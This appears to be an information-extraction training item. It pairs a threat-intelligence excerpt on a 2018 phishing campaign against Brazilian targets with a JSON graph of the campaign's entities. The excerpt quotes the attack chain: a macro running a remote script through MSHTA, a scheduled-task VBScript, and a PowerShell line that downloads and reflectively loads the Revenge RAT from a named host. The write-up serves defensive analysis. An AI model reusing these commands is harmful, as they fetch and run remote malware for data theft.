@@ -1,0 +1,117 @@
+
+
+
+Sentence : The attacker’s deliver mechanisms y
+Our telemetry for this campaign identified email as the primary delivery mechanism and found
+the first related samples were distributed in August 2018. Topics used by the actor are typically
+related to travel bookings and vouchers, and target mainly Brazilian victims. Table 1 shows a
+representative list of typical subjects and attachment names found during the campaign.
+Email Subject Attachment names
+Reserva para
+tres quartos
+Reserva Veirano
+Advogador
+Corrigir data da
+reserva para o
+dia 03
+Voucher para
+reserva
+“Ficha cadastral Leticia Ferreira Mendes.ppam”, “Ficha cadastral Jacinto Mendes da
+Silva.ppam”, “Ficha cadastral Marcos Portela Correa.ppam”, “Ficha cadastral Francisco
+Prado.ppam”
+Roominglist Veirano Advogados .docx
+Booking – Dados da Reserva.docx
+Voucher para reserva 02.docx
+Reserva Voucher de Reserva ADRIANA MILLER RODRIGUES.ppa
+Table 1 Some email subjects and attachment names representative of this campaign.
+While investigating the malicious documents used in the campaign, we discovered an interesting
+consistency in the document metadata. The author consistently uses an acronym throughout
+their work – “C.D.T Original” (see details on Figure 1).
+1/16
+Figure 1 Example of malicious document metadata
+The attackers make use of multiple common off-the-shelf methods that are observed in many
+campaigns, such as external references to remote scripts executed by MSHTA. Following this
+approach, this actor can find multiple tools and resources to perform their activities, and at the
+same time, make attribution and tracking more difficult for analysts. The most prevalent
+combinations of methods observed are depicted in Figure 2.
+Figure 2 Multiple delivery mechanisms.
+As an example of an email delivery used during December 2018 campaigns, let’s look at what
+pretended to be a rooming list (SHA256:
+ac70d15106cc368c571c3969c456778b494d62c5319dc366b7e2c116834c6187), which follows
+2/16
+one path from Figure 2, more precisely the steps described in Figure 3.
+Figure 3 December 2018 campaign delivery example
+The malicious documents contain a simple Macro, which executes a remotely-hosted script
+using MSHTA:
+Public Sub Auto_Open()
+var0 = “MSHTA https://bit[.]ly/2QXNTHi”
+Var = var0
+Shell (Var)
+End Sub
+The landing URL resolves to:
+hxxps://internetexplorer200[.]blogspot[.]com/
+The statistics for the URL-shortened link on bit.ly confirm the observations from our telemetry,
+showing targets mainly in Brazil, as depicted in Figure 4 Distribution of Bit.ly campaign on 27
+28th December.
+Figure 4 Distribution of Bit.ly campaign on 27-28th December
+3/16
+MSHTA executes VBScript contents that are encoded/obfuscated using a very simple algorithm
+(note the presence of Portuguese words throughout the code).
+Figure 5 First stage VBScript code run via MSHTA
+This results in the following scheduled task created in the system, where a new second-stage
+script is invoked via MSHTA from another remote location. Note that the second-stage VB code
+contains a reference to “CDT” in a comment.
+“set shhh = CreateObject(\”WScript.Shell\”)\r\n  Dim var1\r\n var1 = \”cmd.exe /c SchTasks
+/Create /sc MINUTE /MO 240 /TN AdobeUpdateSD /TR \”\”.exe
+https://minhacasaminhavidacdt.blogspot[.]com/\”\r\nshhh.run var1, vbHide\r\n”
+Figure 6 Second-stage VB script
+This second-stage VBScript code ends up loading a final payload in memory via PowerShell
+reflection, fetching the binary content from a file with a GIF extension:
+“CreateObject(\”Wscript.Shell\”).run \”cmd.exe /c powershell -ExecutionPolicy Bypass windowstyle hidden -noexit -command
+Net.WebClient).DownloadString(‘http://achoteis.com[.]br/images/64.gif’))).EntryPoint.Invoke($null,$null)\”\r\n”
+The final payload delivered in this case is Revenge Remote Access Trojan (RAT), a commodity
+tool which can be used to facilitate information theft.
+Output : 
+{
+    "nodes": [
+        {"id": 1, "description": "Attacker", "type" : "ACTO"},
+        {"id": 2, "description": "Emails with travel bookings and vouchers topics", "type" : "MAIL"},
+        {"id": 3, "description": "Ficha cadastral Leticia Ferreira Mendes.ppam", "type" : "DOCF"},
+        {"id": 4, "description": "Ficha cadastral Jacinto Mendes da Silva.ppam", "type" : "DOCF"},
+        {"id": 5, "description": "Ficha cadastral Marcos Portela Correa.ppam", "type" : "DOCF"},
+        {"id": 6, "description": "Ficha cadastral Francisco Prado.ppam", "type" : "DOCF"},
+        {"id": 7, "description": "Roominglist Veirano Advogados .docx", "type" : "DOCF"},
+        {"id": 8, "description": "Booking – Dados da Reserva.docx", "type" : "DOCF"},
+        {"id": 9, "description": "Voucher para reserva 02.docx", "type" : "DOCF"},
+        {"id": 10, "description": "Reserva Voucher de Reserva ADRIANA MILLER RODRIGUES.ppa", "type" : "DOCF"},
+        {"id": 11, "description": "C.D.T Original (acronym in document metadata)", "type" : "TAMP"},
+        {"id": 12, "description": "MSHTA", "type" : "APPS"},
+        {"id": 13, "description": "bit[.]ly/2QXNTHi", "type" : "URLS"},
+        {"id": 14, "description": "hxxps://internetexplorer200[.]blogspot[.]com/", "type" : "CCSH"},
+        {"id": 15, "description": "bit.ly campaign", "type" : "TAMP"},
+        {"id": 16, "description": "Brazil (main target location)", "type" : "COUN"},
+        {"id": 17, "description": "Scheduled task (AdobeUpdateSD)", "type" : "REGI"},
+        {"id": 18, "description": "minhacasaminhavidacdt.blogspot[.]com", "type" : "CCSH"},
+        {"id": 19, "description": "http://achoteis.com[.]br/images/64.gif", "type" : "URLS"},
+        {"id": 20, "description": "Revenge Remote Access Trojan (RAT)", "type" : "EXEF"}
+    ],
+    "edges": [
+        {"source": 1, "target": 2, "rel_name" : "sends"},
+        {"source": 2, "target": 3, "rel_name" : "contains"},
+        {"source": 2, "target": 4, "rel_name" : "contains"},
+        {"source": 2, "target": 5, "rel_name" : "contains"},
+        {"source": 2, "target": 6, "rel_name" : "contains"},
+        {"source": 2, "target": 7, "rel_name" : "contains"},
+        {"source": 2, "target": 8, "rel_name" : "contains"},
+        {"source": 2, "target": 9, "rel_name" : "contains"},
+        {"source": 2, "target": 10, "rel_name" : "contains"},
+        {"source": 3, "target": 11, "rel_name" : "uses"},
+        {"source": 12, "target": 13, "rel_name" : "executes"},
+        {"source": 13, "target": 14, "rel_name" : "resolves to"},
+        {"source": 15, "target": 16, "rel_name" : "targets"},
+        {"source": 12, "target": 17, "rel_name" : "creates"},
+        {"source": 17, "target": 18, "rel_name" : "references"},
+        {"source": 12, "target": 19, "rel_name" : "fetches from"},
+        {"source": 19, "target": 20, "rel_name" : "delivers"}
+    ]
+}
